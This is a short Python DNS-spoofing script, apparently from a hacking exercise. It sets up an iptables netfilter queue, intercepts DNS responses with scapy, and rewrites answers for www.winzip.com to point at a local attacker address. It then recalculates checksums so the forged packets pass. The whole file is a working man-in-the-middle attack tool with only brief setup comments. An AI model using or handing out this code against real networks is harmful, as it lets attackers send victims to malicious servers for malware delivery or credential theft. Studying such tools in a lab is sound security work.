#!/usr/bin/env python

# iptables -I FORWARD -j NFQUEUE --queue-num 0 <- **run command to create queue which we will bind to**
# If testing locally, -I INPUT, OUTPUT in two separate commands
# iptables --flush <- **Run this when you are done, or it will continue using the queue,and you don't want that**

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.winzip.com" in str(qname):
            print("[+] Spoofing target...")
            answer=scapy.DNSRR(rrname=qname, rdata="192.168.119.139")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))
            # packet.set_payload(scapy_packet.encode()) <- same as above, dif syntax
    packet.accept()

queue= netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()